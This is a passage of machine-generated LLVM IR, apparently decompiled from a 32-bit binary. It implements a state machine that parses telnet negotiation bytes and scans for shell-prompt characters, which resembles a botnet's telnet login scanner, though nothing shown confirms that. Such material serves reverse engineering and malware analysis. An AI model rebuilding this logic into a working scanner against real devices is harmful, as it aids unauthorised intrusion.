  %v2_804f0bb = inttoptr i32 %v0_804f0b8 to i32*
  store i32 %v0_804f0bb, i32* %v2_804f0bb, align 4
  %v0_804f0bd = load i32, i32* @edi, align 4
  %v1_804f0bd = add i32 %v0_804f0bd, 24
  %v2_804f0bd = inttoptr i32 %v1_804f0bd to i32*
  store i32 0, i32* %v2_804f0bd, align 4
  %v0_804efc0.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804efc8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804efc0

dec_label_pc_804f0e1:                             ; preds = %dec_label_pc_804f0d6.preheader, %dec_label_pc_804f0d6.backedge.dec_label_pc_804f0e1_crit_edge
  %v1_804f0e4 = phi i32 [ %v1_804f0e4.pre, %dec_label_pc_804f0d6.backedge.dec_label_pc_804f0e1_crit_edge ], [ %v0_804efc8, %dec_label_pc_804f0d6.preheader ]
  %v0_804f0e1 = phi i32 [ %v0_804f0d6, %dec_label_pc_804f0d6.backedge.dec_label_pc_804f0e1_crit_edge ], [ %v0_804f0d640, %dec_label_pc_804f0d6.preheader ]
  %v1_804f0e1 = add i32 %v0_804f0e1, 28
  store i32 %v1_804f0e1, i32* %eax.global-to-local, align 4
  %v2_804f0e4 = add i32 %v1_804f0e4, 12
  %v3_804f0e4 = inttoptr i32 %v2_804f0e4 to i32*
  store i32 %v1_804f0e1, i32* %v3_804f0e4, align 4
  %v0_804f0e8 = load i32, i32* @edi, align 4
  %v1_804f0e8 = add i32 %v0_804f0e8, 24
  %v2_804f0e8 = inttoptr i32 %v1_804f0e8 to i32*
  %v3_804f0e8 = load i32, i32* %v2_804f0e8, align 4
  %v9_804f0e8 = icmp eq i32 %v3_804f0e8, 256
  br i1 %v9_804f0e8, label %dec_label_pc_804f675, label %dec_label_pc_804f0f5

dec_label_pc_804f0f5:                             ; preds = %dec_label_pc_804f0e1, %dec_label_pc_804f675
  %v0_804f0f5 = load i32, i32* @esp, align 4
  %v1_804f0f5 = add i32 %v0_804f0f5, 88
  %v2_804f0f5 = inttoptr i32 %v1_804f0f5 to i32*
  %v3_804f0f5 = load i32, i32* %v2_804f0f5, align 4
  store i32 %v3_804f0f5, i32* %ecx.global-to-local, align 4
  %v1_804f0f9 = add i32 %v0_804f0f5, 12
  %v2_804f0f9 = inttoptr i32 %v1_804f0f9 to i32*
  %v3_804f0f9 = load i32, i32* %v2_804f0f9, align 4
  store i32 %v3_804f0f9, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_804f102 = inttoptr i32 %v3_804f0f5 to i32*
  store i32 0, i32* %v1_804f102, align 4
  %v0_804f108 = load i32, i32* @edi, align 4
  %v1_804f108 = add i32 %v0_804f108, 24
  %v2_804f108 = inttoptr i32 %v1_804f108 to i32*
  %v3_804f108 = load i32, i32* %v2_804f108, align 4
  store i32 %v3_804f108, i32* %edx.global-to-local, align 4
  %v0_804f10b = load i32, i32* @esp, align 4
  %v1_804f10b = add i32 %v0_804f10b, -4
  %v2_804f10b = inttoptr i32 %v1_804f10b to i32*
  store i32 16384, i32* %v2_804f10b, align 4
  %v0_804f110 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f110 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f110 = add i32 %v1_804f110, %v0_804f110
  store i32 %v2_804f110, i32* @ebx, align 4
  %v0_804f112 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f112 = sub i32 %v0_804f112, %v1_804f110
  store i32 %v2_804f112, i32* %eax.global-to-local, align 4
  %v2_804f114 = add i32 %v0_804f10b, -8
  %v3_804f114 = inttoptr i32 %v2_804f114 to i32*
  store i32 %v2_804f112, i32* %v3_804f114, align 4
  %v0_804f115 = load i32, i32* @ebx, align 4
  %v2_804f115 = add i32 %v0_804f10b, -12
  %v3_804f115 = inttoptr i32 %v2_804f115 to i32*
  store i32 %v0_804f115, i32* %v3_804f115, align 4
  %v0_804f116 = load i32, i32* @edi, align 4
  %v1_804f116 = add i32 %v0_804f116, 4
  %v2_804f116 = inttoptr i32 %v1_804f116 to i32*
  %v3_804f116 = load i32, i32* %v2_804f116, align 4
  %v2_804f119 = add i32 %v0_804f10b, -16
  %v3_804f119 = inttoptr i32 %v2_804f119 to i32*
  store i32 %v3_804f116, i32* %v3_804f119, align 4
  %v0_804f11a = call i32 @function_8051620()
  store i32 %v0_804f11a, i32* %eax.global-to-local, align 4
  %v0_804f11f = load i32, i32* @esp, align 4
  %v1_804f11f = add i32 %v0_804f11f, 16
  %tmp172 = icmp slt i32 %v0_804f11a, 1
  br i1 %tmp172, label %dec_label_pc_804f61b, label %dec_label_pc_804f12b

dec_label_pc_804f12b:                             ; preds = %dec_label_pc_804f0f5
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_804f12d

dec_label_pc_804f12d:                             ; preds = %dec_label_pc_804f137, %dec_label_pc_804f12b
  %v0_804f133 = phi i32 [ %v1_804f137, %dec_label_pc_804f137 ], [ 0, %dec_label_pc_804f12b ]
  %v1_804f12d = load i32, i32* @ebx, align 4
  %v2_804f12d = add i32 %v1_804f12d, %v0_804f133
  %v3_804f12d = inttoptr i32 %v2_804f12d to i8*
  %v4_804f12d = load i8, i8* %v3_804f12d, align 1
  %v5_804f12d = icmp eq i8 %v4_804f12d, 0
  %v1_804f131 = icmp eq i1 %v5_804f12d, false
  br i1 %v1_804f131, label %dec_label_pc_804f137, label %dec_label_pc_804f133

dec_label_pc_804f133:                             ; preds = %dec_label_pc_804f12d
  store i8 65, i8* %v3_804f12d, align 1
  %v0_804f137.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f137

dec_label_pc_804f137:                             ; preds = %dec_label_pc_804f12d, %dec_label_pc_804f133
  %v0_804f137 = phi i32 [ %v0_804f133, %dec_label_pc_804f12d ], [ %v0_804f137.pre, %dec_label_pc_804f133 ]
  %v1_804f137 = add i32 %v0_804f137, 1
  store i32 %v1_804f137, i32* @edx, align 4
  %v12_804f138 = icmp eq i32 %v0_804f11a, %v1_804f137
  %v1_804f13a = icmp eq i1 %v12_804f138, false
  br i1 %v1_804f13a, label %dec_label_pc_804f12d, label %dec_label_pc_804f13c

dec_label_pc_804f13c:                             ; preds = %dec_label_pc_804f137, %dec_label_pc_804f621
  %v0_804f13c = load i32, i32* @edi, align 4
  %v1_804f13c = add i32 %v0_804f13c, 24
  %v2_804f13c = inttoptr i32 %v1_804f13c to i32*
  %v3_804f13c = load i32, i32* %v2_804f13c, align 4
  %v2_804f13f = add i32 %v3_804f13c, %v0_804f11a
  store i32 %v2_804f13f, i32* @ebx, align 4
  %v0_804f141 = load i32, i32* @global_var_8055130.9, align 16
  store i32 %v0_804f141, i32* %eax.global-to-local, align 4
  store i32 %v2_804f13f, i32* %v2_804f13c, align 4
  %v0_804f149 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f149 = load i32, i32* @edi, align 4
  %v2_804f149 = add i32 %v1_804f149, 8
  %v3_804f149 = inttoptr i32 %v2_804f149 to i32*
  store i32 %v0_804f149, i32* %v3_804f149, align 4
  br label %dec_label_pc_804f14c

dec_label_pc_804f14c:                             ; preds = %dec_label_pc_804f504, %dec_label_pc_804f13c
  %v0_804f14c = load i32, i32* @edi, align 4
  %v1_804f14c = add i32 %v0_804f14c, 12
  %v2_804f14c = inttoptr i32 %v1_804f14c to i32*
  %v3_804f14c = load i32, i32* %v2_804f14c, align 4
  store i32 %v3_804f14c, i32* %eax.global-to-local, align 4
  switch i32 %v3_804f14c, label %dec_label_pc_804f0d6.backedge [
    i32 2, label %dec_label_pc_804f15c
    i32 3, label %dec_label_pc_804f1ef
    i32 4, label %dec_label_pc_804f524
    i32 5, label %dec_label_pc_804f234
    i32 6, label %dec_label_pc_804f280
    i32 7, label %dec_label_pc_804f337
    i32 8, label %dec_label_pc_804f433
    i32 9, label %dec_label_pc_804f3ee
    i32 10, label %dec_label_pc_804f478
  ]

dec_label_pc_804f15c:                             ; preds = %dec_label_pc_804f14c
  %v0_804f15c = load i32, i32* @esp, align 4
  %v1_804f15c = add i32 %v0_804f15c, 12
  %v2_804f15c = inttoptr i32 %v1_804f15c to i32*
  %v3_804f15c = load i32, i32* %v2_804f15c, align 4
  store i32 %v3_804f15c, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804f162 = add i32 %v0_804f14c, 24
  %v2_804f162 = inttoptr i32 %v1_804f162 to i32*
  %v3_804f162 = load i32, i32* %v2_804f162, align 4
  store i32 %v3_804f162, i32* %edx.global-to-local, align 4
  %v2_804f16531 = sub i32 0, %v3_804f162
  %v10_804f16535 = and i32 %v3_804f162, %v2_804f16531
  %v11_804f16536 = icmp slt i32 %v10_804f16535, 0
  %v13_804f16538 = icmp slt i32 %v2_804f16531, 0
  %v2_804f16739 = icmp eq i1 %v13_804f16538, %v11_804f16536
  br i1 %v2_804f16739, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f169.preheader

dec_label_pc_804f169.preheader:                   ; preds = %dec_label_pc_804f15c, %dec_label_pc_804f165.backedge
  %v0_804f1e3150 = phi i32 [ %v0_804f1e3152, %dec_label_pc_804f165.backedge ], [ %v0_804f14c, %dec_label_pc_804f15c ]
  %v0_804f563143 = phi i32 [ %v0_804f165, %dec_label_pc_804f165.backedge ], [ 0, %dec_label_pc_804f15c ]
  %v5_804f17b136 = phi i32 [ %v5_804f17b137, %dec_label_pc_804f165.backedge ], [ 2, %dec_label_pc_804f15c ]
  %v1_804f175134 = phi i32 [ %v1_804f165, %dec_label_pc_804f165.backedge ], [ %v3_804f162, %dec_label_pc_804f15c ]
  %v0_804f16e131 = phi i32 [ %v0_804f16e132, %dec_label_pc_804f165.backedge ], [ %v0_804f15c, %dec_label_pc_804f15c ]
  br label %dec_label_pc_804f169

dec_label_pc_804f169:                             ; preds = %dec_label_pc_804f169.preheader, %dec_label_pc_804f1ba
  %v0_804f1e3153 = phi i32 [ %v0_804f1e3150, %dec_label_pc_804f169.preheader ], [ %v0_804f1d1, %dec_label_pc_804f1ba ]
  %v0_804f563 = phi i32 [ %v0_804f563143, %dec_label_pc_804f169.preheader ], [ %v0_804f1d7, %dec_label_pc_804f1ba ]
  %v5_804f17b = phi i32 [ %v5_804f17b136, %dec_label_pc_804f169.preheader ], [ %v0_804f1cc, %dec_label_pc_804f1ba ]
  %v1_804f175 = phi i32 [ %v1_804f175134, %dec_label_pc_804f169.preheader ], [ %v3_804f1d1, %dec_label_pc_804f1ba ]
  %v0_804f58b = phi i32 [ %v0_804f16e131, %dec_label_pc_804f169.preheader ], [ %v1_804f1d4, %dec_label_pc_804f1ba ]
  %v0_804f169 = load i32, i32* @ebx, align 4
  %v1_804f169 = inttoptr i32 %v0_804f169 to i8*
  %v2_804f169 = load i8, i8* %v1_804f169, align 1
  %v12_804f169 = icmp eq i8 %v2_804f169, -1
  %v1_804f16c = icmp eq i1 %v12_804f169, false
  br i1 %v1_804f16c, label %dec_label_pc_804f1db, label %dec_label_pc_804f16e

dec_label_pc_804f16e:                             ; preds = %dec_label_pc_804f169
  %v1_804f16e = add i32 %v0_804f58b, 12
  %v2_804f16e = inttoptr i32 %v1_804f16e to i32*
  %v3_804f16e = load i32, i32* %v2_804f16e, align 4
  %v1_804f172 = add i32 %v0_804f169, 1
  store i32 %v1_804f172, i32* @esi, align 4
  %v2_804f175 = add i32 %v3_804f16e, %v1_804f175
  store i32 %v2_804f175, i32* %ecx.global-to-local, align 4
  %tmp818 = icmp ugt i32 %v2_804f175, %v1_804f172
  br i1 %tmp818, label %dec_label_pc_804f17b, label %dec_label_pc_804f1db

dec_label_pc_804f17b:                             ; preds = %dec_label_pc_804f16e
  %v2_804f17b = inttoptr i32 %v1_804f172 to i8*
  %v3_804f17b = load i8, i8* %v2_804f17b, align 1
  %v4_804f17b = zext i8 %v3_804f17b to i32
  %v6_804f17b = and i32 %v5_804f17b, -256
  %v7_804f17b = or i32 %v4_804f17b, %v6_804f17b
  store i32 %v7_804f17b, i32* %eax.global-to-local, align 4
  switch i8 %v3_804f17b, label %dec_label_pc_804f18e [
    i8 -1, label %dec_label_pc_804f560
    i8 -3, label %dec_label_pc_804f58b
  ]

dec_label_pc_804f18e:                             ; preds = %dec_label_pc_804f17b
  %v1_804f18e = add i32 %v0_804f169, 2
  store i32 %v1_804f18e, i32* %eax.global-to-local, align 4
  %tmp819 = icmp ugt i32 %v2_804f175, %v1_804f18e
  br i1 %tmp819, label %dec_label_pc_804f195, label %dec_label_pc_804f1db

dec_label_pc_804f195:                             ; preds = %dec_label_pc_804f18e, %dec_label_pc_804fb52, %dec_label_pc_804fb5a, %dec_label_pc_804f613
  %v0_804f195 = load i32, i32* @esi, align 4
  %v1_804f195 = inttoptr i32 %v0_804f195 to i8*
  %v2_804f195 = load i8, i8* %v1_804f195, align 1
  %v3_804f195 = zext i8 %v2_804f195 to i32
  %v4_804f195 = load i32, i32* %eax.global-to-local, align 4
  %v5_804f195 = and i32 %v4_804f195, -256
  %v6_804f195 = or i32 %v5_804f195, %v3_804f195
  store i32 %v6_804f195, i32* %eax.global-to-local, align 4
  switch i8 %v2_804f195, label %dec_label_pc_804f1a7 [
    i8 -3, label %dec_label_pc_804f574
    i8 -5, label %dec_label_pc_804f698
  ]

dec_label_pc_804f1a7:                             ; preds = %dec_label_pc_804f195, %dec_label_pc_804f698
  %v5_804f1a7 = phi i32 [ %v5_804f1a7.pre, %dec_label_pc_804f698 ], [ %v6_804f195, %dec_label_pc_804f195 ]
  %v0_804f1a7 = load i32, i32* @ebx, align 4
  %v1_804f1a7 = add i32 %v0_804f1a7, 2
  %v2_804f1a7 = inttoptr i32 %v1_804f1a7 to i8*
  %v3_804f1a7 = load i8, i8* %v2_804f1a7, align 1
  %v4_804f1a7 = zext i8 %v3_804f1a7 to i32
  %v6_804f1a7 = and i32 %v5_804f1a7, -256
  %v7_804f1a7 = or i32 %v4_804f1a7, %v6_804f1a7
  store i32 %v7_804f1a7, i32* %eax.global-to-local, align 4
  %v11_804f1aa = icmp eq i8 %v3_804f1a7, -3
  br i1 %v11_804f1aa, label %dec_label_pc_804f582, label %dec_label_pc_804f1b2

dec_label_pc_804f1b2:                             ; preds = %dec_label_pc_804f574, %dec_label_pc_804f1a7
  %v0_804f6a0 = phi i32 [ %v0_804f577, %dec_label_pc_804f574 ], [ %v0_804f1a7, %dec_label_pc_804f1a7 ]
  %v0_804f1b2 = phi i32 [ %v7_804f577, %dec_label_pc_804f574 ], [ %v7_804f1a7, %dec_label_pc_804f1a7 ]
  %v1_804f1b2 = trunc i32 %v0_804f1b2 to i8
  %v11_804f1b2 = icmp eq i8 %v1_804f1b2, -5
  br i1 %v11_804f1b2, label %dec_label_pc_804f6a0, label %dec_label_pc_804f1ba

dec_label_pc_804f1ba:                             ; preds = %dec_label_pc_804f1b2, %dec_label_pc_804f6a0, %dec_label_pc_804f582
  %v0_804f1ba = load i32, i32* @esp, align 4
  %v1_804f1ba = add i32 %v0_804f1ba, -4
  %v2_804f1ba = inttoptr i32 %v1_804f1ba to i32*
  store i32 16384, i32* %v2_804f1ba, align 4
  %v1_804f1bf = add i32 %v0_804f1ba, -8
  %v2_804f1bf = inttoptr i32 %v1_804f1bf to i32*
  store i32 3, i32* %v2_804f1bf, align 4
  %v0_804f1c1 = load i32, i32* @ebx, align 4
  %v2_804f1c1 = add i32 %v0_804f1ba, -12
  %v3_804f1c1 = inttoptr i32 %v2_804f1c1 to i32*
  store i32 %v0_804f1c1, i32* %v3_804f1c1, align 4
  %v0_804f1c2 = load i32, i32* @ebp, align 4
  %v1_804f1c2 = add i32 %v0_804f1c2, 3
  store i32 %v1_804f1c2, i32* @ebp, align 4
  %v0_804f1c5 = load i32, i32* @edi, align 4
  %v1_804f1c5 = add i32 %v0_804f1c5, 4
  %v2_804f1c5 = inttoptr i32 %v1_804f1c5 to i32*
  %v3_804f1c5 = load i32, i32* %v2_804f1c5, align 4
  store i32 %v3_804f1c5, i32* @esi, align 4
  %v0_804f1c8 = load i32, i32* @ebx, align 4
  %v1_804f1c8 = add i32 %v0_804f1c8, 3
  store i32 %v1_804f1c8, i32* @ebx, align 4
  %v2_804f1cb = add i32 %v0_804f1ba, -16
  %v3_804f1cb = inttoptr i32 %v2_804f1cb to i32*
  store i32 %v3_804f1c5, i32* %v3_804f1cb, align 4
  %v0_804f1cc = call i32 @function_8051696()
  store i32 %v0_804f1cc, i32* %eax.global-to-local, align 4
  %v0_804f1d1 = load i32, i32* @edi, align 4
  %v1_804f1d1 = add i32 %v0_804f1d1, 24
  %v2_804f1d1 = inttoptr i32 %v1_804f1d1 to i32*
  %v3_804f1d1 = load i32, i32* %v2_804f1d1, align 4
  store i32 %v3_804f1d1, i32* %edx.global-to-local, align 4
  %v0_804f1d4 = load i32, i32* @esp, align 4
  %v1_804f1d4 = add i32 %v0_804f1d4, 16
  %v0_804f1d7 = load i32, i32* @ebp, align 4
  %v2_804f1d7 = sub i32 %v0_804f1d7, %v3_804f1d1
  %v8_804f1d7 = xor i32 %v0_804f1d7, %v3_804f1d1
  %v9_804f1d7 = xor i32 %v2_804f1d7, %v0_804f1d7
  %v10_804f1d7 = and i32 %v9_804f1d7, %v8_804f1d7
  %v11_804f1d7 = icmp slt i32 %v10_804f1d7, 0
  %v13_804f1d7 = icmp slt i32 %v2_804f1d7, 0
  %v2_804f1d9 = icmp eq i1 %v13_804f1d7, %v11_804f1d7
  br i1 %v2_804f1d9, label %dec_label_pc_804f1db, label %dec_label_pc_804f169

dec_label_pc_804f1db:                             ; preds = %dec_label_pc_804f165.backedge, %dec_label_pc_804f18e, %dec_label_pc_804f16e, %dec_label_pc_804f1ba, %dec_label_pc_804f169, %dec_label_pc_804f58b.dec_label_pc_804f1db.loopexit_crit_edge
  %v0_804f1e3 = phi i32 [ %v0_804f5ef, %dec_label_pc_804f58b.dec_label_pc_804f1db.loopexit_crit_edge ], [ %v0_804f1d1, %dec_label_pc_804f1ba ], [ %v0_804f1e3153, %dec_label_pc_804f18e ], [ %v0_804f1e3153, %dec_label_pc_804f16e ], [ %v0_804f1e3153, %dec_label_pc_804f169 ], [ %v0_804f1e3152, %dec_label_pc_804f165.backedge ]
  %v0_804f1db = phi i32 [ %v0_804f1db.pre.pre, %dec_label_pc_804f58b.dec_label_pc_804f1db.loopexit_crit_edge ], [ %v0_804f1d7, %dec_label_pc_804f1ba ], [ %v0_804f563, %dec_label_pc_804f18e ], [ %v0_804f563, %dec_label_pc_804f16e ], [ %v0_804f563, %dec_label_pc_804f169 ], [ %v0_804f165, %dec_label_pc_804f165.backedge ]
  %tmp173 = icmp slt i32 %v0_804f1db, 1
  br i1 %tmp173, label %dec_label_pc_804f56b, label %dec_label_pc_804f1e3

dec_label_pc_804f1e3:                             ; preds = %dec_label_pc_804f1db
  %v1_804f1e3 = add i32 %v0_804f1e3, 12
  %v2_804f1e3 = inttoptr i32 %v1_804f1e3 to i32*
  store i32 3, i32* %v2_804f1e3, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804f1ef:                             ; preds = %dec_label_pc_804f14c
  %v1_804f1ef = add i32 %v0_804f14c, 24
  %v2_804f1ef = inttoptr i32 %v1_804f1ef to i32*
  %v3_804f1ef = load i32, i32* %v2_804f1ef, align 4
  %v1_804f1f2 = add i32 %v3_804f1ef, -1
  store i32 %v1_804f1f2, i32* %eax.global-to-local, align 4
  %tmp174 = icmp slt i32 %v1_804f1f2, 1
  br i1 %tmp174, label %dec_label_pc_804f8d1, label %dec_label_pc_804f1fb.preheader

dec_label_pc_804f1fb.preheader:                   ; preds = %dec_label_pc_804f1ef
  %v7_804f1fb.pre = load i32, i32* @edx, align 4
  %v2_804f1fb = add i32 %v0_804f14c, 28
  br label %dec_label_pc_804f1fb

dec_label_pc_804f1fb:                             ; preds = %dec_label_pc_804f1fb.preheader, %dec_label_pc_804f22c
  %v7_804f1fb = phi i32 [ %v7_804f1fb.pre, %dec_label_pc_804f1fb.preheader ], [ %v9_804f1fb, %dec_label_pc_804f22c ]
  %v0_804f8c5 = phi i32 [ %v1_804f1f2, %dec_label_pc_804f1fb.preheader ], [ %v1_804f22c, %dec_label_pc_804f22c ]
  %v3_804f1fb = add i32 %v2_804f1fb, %v0_804f8c5
  %v4_804f1fb = inttoptr i32 %v3_804f1fb to i8*
  %v5_804f1fb = load i8, i8* %v4_804f1fb, align 1
  %v6_804f1fb = zext i8 %v5_804f1fb to i32
  %v8_804f1fb = and i32 %v7_804f1fb, -256
  %v9_804f1fb = or i32 %v6_804f1fb, %v8_804f1fb
  store i32 %v9_804f1fb, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f1fb, label %dec_label_pc_804f22c [
    i8 58, label %dec_label_pc_804f8c5
    i8 62, label %dec_label_pc_804f8c5
    i8 36, label %dec_label_pc_804f8c5
    i8 35, label %dec_label_pc_804f8c5
    i8 37, label %dec_label_pc_804f8c5
  ]

dec_label_pc_804f22c:                             ; preds = %dec_label_pc_804f1fb
  %v1_804f22c = add i32 %v0_804f8c5, -1
  %v8_804f22c = icmp eq i32 %v1_804f22c, 0
  store i32 %v1_804f22c, i32* %eax.global-to-local, align 4
  %v1_804f22d = icmp eq i1 %v8_804f22c, false
  br i1 %v1_804f22d, label %dec_label_pc_804f1fb, label %dec_label_pc_804f8d1

dec_label_pc_804f234:                             ; preds = %dec_label_pc_804f14c
  %v1_804f234 = add i32 %v0_804f14c, 24
  %v2_804f234 = inttoptr i32 %v1_804f234 to i32*
  %v3_804f234 = load i32, i32* %v2_804f234, align 4
  %v1_804f237 = add i32 %v3_804f234, -1
  store i32 %v1_804f237, i32* %eax.global-to-local, align 4
  %tmp175 = icmp slt i32 %v1_804f237, 1
  br i1 %tmp175, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f240.preheader

dec_label_pc_804f240.preheader:                   ; preds = %dec_label_pc_804f234
  %v7_804f240.pre = load i32, i32* @edx, align 4
  %v2_804f240 = add i32 %v0_804f14c, 28
  br label %dec_label_pc_804f240

dec_label_pc_804f240:                             ; preds = %dec_label_pc_804f240.preheader, %dec_label_pc_804f271
  %v7_804f240 = phi i32 [ %v7_804f240.pre, %dec_label_pc_804f240.preheader ], [ %v9_804f240, %dec_label_pc_804f271 ]
  %v0_804f84c = phi i32 [ %v1_804f237, %dec_label_pc_804f240.preheader ], [ %v1_804f271, %dec_label_pc_804f271 ]
  %v3_804f240 = add i32 %v2_804f240, %v0_804f84c
  %v4_804f240 = inttoptr i32 %v3_804f240 to i8*
  %v5_804f240 = load i8, i8* %v4_804f240, align 1
  %v6_804f240 = zext i8 %v5_804f240 to i32
  %v8_804f240 = and i32 %v7_804f240, -256
  %v9_804f240 = or i32 %v6_804f240, %v8_804f240
  store i32 %v9_804f240, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f240, label %dec_label_pc_804f271 [
    i8 58, label %dec_label_pc_804f84c
    i8 62, label %dec_label_pc_804f84c
    i8 36, label %dec_label_pc_804f84c
    i8 35, label %dec_label_pc_804f84c
    i8 37, label %dec_label_pc_804f84c
  ]

dec_label_pc_804f271:                             ; preds = %dec_label_pc_804f240
  %v1_804f271 = add i32 %v0_804f84c, -1
  %v8_804f271 = icmp eq i32 %v1_804f271, 0
  store i32 %v1_804f271, i32* %eax.global-to-local, align 4
  %v1_804f272 = icmp eq i1 %v8_804f271, false
  br i1 %v1_804f272, label %dec_label_pc_804f240, label %dec_label_pc_804f0d6.backedge

dec_label_pc_804f280:                             ; preds = %dec_label_pc_804f14c
  %v1_804f280 = add i32 %v0_804f14c, 24
  %v2_804f280 = inttoptr i32 %v1_804f280 to i32*
  %v3_804f280 = load i32, i32* %v2_804f280, align 4
  %v1_804f283 = add i32 %v3_804f280, -1
  store i32 %v1_804f283, i32* %eax.global-to-local, align 4
  %tmp176 = icmp slt i32 %v1_804f283, 1
  br i1 %tmp176, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f28c

dec_label_pc_804f28c:                             ; preds = %dec_label_pc_804f280
  %v2_804f28c = add i32 %v0_804f14c, 27
  %v3_804f28c = add i32 %v2_804f28c, %v3_804f280
  %v4_804f28c = inttoptr i32 %v3_804f28c to i8*
  %v5_804f28c = load i8, i8* %v4_804f28c, align 1
  %v6_804f28c = zext i8 %v5_804f28c to i32
  %v7_804f28c = load i32, i32* @edx, align 4
  %v8_804f28c = and i32 %v7_804f28c, -256
  %v9_804f28c = or i32 %v8_804f28c, %v6_804f28c
  store i32 %v9_804f28c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f28c, label %dec_label_pc_804f29a [
    i8 62, label %dec_label_pc_804f2be.thread
    i8 58, label %dec_label_pc_804f2be.thread
  ]

dec_label_pc_804f29a:                             ; preds = %dec_label_pc_804f28c, %dec_label_pc_804f2b0
  %v0_804f2a9 = phi i32 [ %v1_804f2a9, %dec_label_pc_804f2b0 ], [ %v1_804f283, %dec_label_pc_804f28c ]
  %v7_804f2b0 = phi i32 [ %v9_804f2b0, %dec_label_pc_804f2b0 ], [ %v9_804f28c, %dec_label_pc_804f28c ]
  %v1_804f29a = trunc i32 %v7_804f2b0 to i8
  %v1_804f29a.off = add i8 %v1_804f29a, -35
  %switch = icmp ult i8 %v1_804f29a.off, 3
  br i1 %switch, label %dec_label_pc_804f2be, label %dec_label_pc_804f2a9

dec_label_pc_804f2a9:                             ; preds = %dec_label_pc_804f29a
  %v1_804f2a9 = add i32 %v0_804f2a9, -1
  %v8_804f2a9 = icmp eq i32 %v1_804f2a9, 0
  store i32 %v1_804f2a9, i32* %eax.global-to-local, align 4
  br i1 %v8_804f2a9, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f2b0

dec_label_pc_804f2b0:                             ; preds = %dec_label_pc_804f2a9
  %v3_804f2b0 = add i32 %v2_804f28c, %v0_804f2a9
  %v4_804f2b0 = inttoptr i32 %v3_804f2b0 to i8*
  %v5_804f2b0 = load i8, i8* %v4_804f2b0, align 1
  %v6_804f2b0 = zext i8 %v5_804f2b0 to i32
  %v8_804f2b0 = and i32 %v7_804f2b0, -256
  %v9_804f2b0 = or i32 %v6_804f2b0, %v8_804f2b0
  store i32 %v9_804f2b0, i32* %edx.global-to-local, align 4
  %v10_804f2b4 = icmp ne i8 %v5_804f2b0, 58
  %v10_804f2b9 = icmp eq i8 %v5_804f2b0, 62
  %v1_804f2bc = icmp eq i1 %v10_804f2b9, false
  %or.cond276 = and i1 %v10_804f2b4, %v1_804f2bc
  br i1 %or.cond276, label %dec_label_pc_804f29a, label %dec_label_pc_804f2be

dec_label_pc_804f2be.thread:                      ; preds = %dec_label_pc_804f28c, %dec_label_pc_804f28c
  store i32 %v3_804f280, i32* @ebp, align 4
  br label %dec_label_pc_804f2ca

dec_label_pc_804f2be:                             ; preds = %dec_label_pc_804f29a, %dec_label_pc_804f2b0
  %v0_804f2be = phi i32 [ %v1_804f2a9, %dec_label_pc_804f2b0 ], [ %v0_804f2a9, %dec_label_pc_804f29a ]
  %v1_804f2be = add i32 %v0_804f2be, 1
  store i32 %v1_804f2be, i32* @ebp, align 4
  %v10_804f2c1 = icmp eq i32 %v0_804f2be, -2
  br i1 %v10_804f2c1, label %dec_label_pc_804f0d6.backedge, label %dec_label_pc_804f2ca

dec_label_pc_804f2ca:                             ; preds = %dec_label_pc_804f2be.thread, %dec_label_pc_804f2be
  %v1_804f2be480 = phi i32 [ %v3_804f280, %dec_label_pc_804f2be.thread ], [ %v1_804f2be, %dec_label_pc_804f2be ]
  %tmp177 = icmp slt i32 %v1_804f2be480, 1
  br i1 %tmp177, label %dec_label_pc_804f56b, label %dec_label_pc_804f2d2

dec_label_pc_804f2d2:                             ; preds = %dec_label_pc_804f2ca
  %v0_804f2d2 = load i32, i32* @esp, align 4
  %v1_804f2d5 = add i32 %v0_804f2d2, -16
  %v2_804f2d5 = inttoptr i32 %v1_804f2d5 to i32*
  store i32 6, i32* %v2_804f2d5, align 4
  %v0_804f2d7 = call i32 @function_8050470()
  store i32 %v0_804f2d7, i32* %eax.global-to-local, align 4
  %v0_804f2dc = load i32, i32* @esp, align 4
  %v1_804f2dc = inttoptr i32 %v0_804f2dc to i32*
  %v2_804f2dc = load i32, i32* %v1_804f2dc, align 4
  store i32 %v2_804f2dc, i32* %eax.global-to-local, align 4
  %v3_804f2dc = add i32 %v0_804f2dc, 4
  %v1_804f2dd = inttoptr i32 %v3_804f2dc to i32*
  %v2_804f2dd = load i32, i32* %v1_804f2dd, align 4
  store i32 %v2_804f2dd, i32* %edx.global-to-local, align 4
  %v1_804f2de = add i32 %v0_804f2dc, 1936
  store i32 %v1_804f2de, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f2de, i32* %v1_804f2dd, align 4
  store i32 6, i32* %v1_804f2dc, align 4
  %v0_804f2e8 = call i32 @function_80503c0()
  store i32 %v0_804f2e8, i32* %eax.global-to-local, align 4
  %v0_804f2ed = load i32, i32* @esp, align 4
  %v1_804f2ed = add i32 %v0_804f2ed, -4
  %v2_804f2ed = inttoptr i32 %v1_804f2ed to i32*
  store i32 16384, i32* %v2_804f2ed, align 4
  %v1_804f2f2 = add i32 %v0_804f2ed, 1936
  %v2_804f2f2 = inttoptr i32 %v1_804f2f2 to i32*
  %v3_804f2f2 = load i32, i32* %v2_804f2f2, align 4
  store i32 %v3_804f2f2, i32* @esi, align 4
  %v2_804f2f9 = add i32 %v0_804f2ed, -8
  %v3_804f2f9 = inttoptr i32 %v2_804f2f9 to i32*
  store i32 %v3_804f2f2, i32* %v3_804f2f9, align 4
  %v2_804f2fa = add i32 %v0_804f2ed, -12
  %v3_804f2fa = inttoptr i32 %v2_804f2fa to i32*
  store i32 %v0_804f2e8, i32* %v3_804f2fa, align 4
  %v0_804f2fb = load i32, i32* @edi, align 4
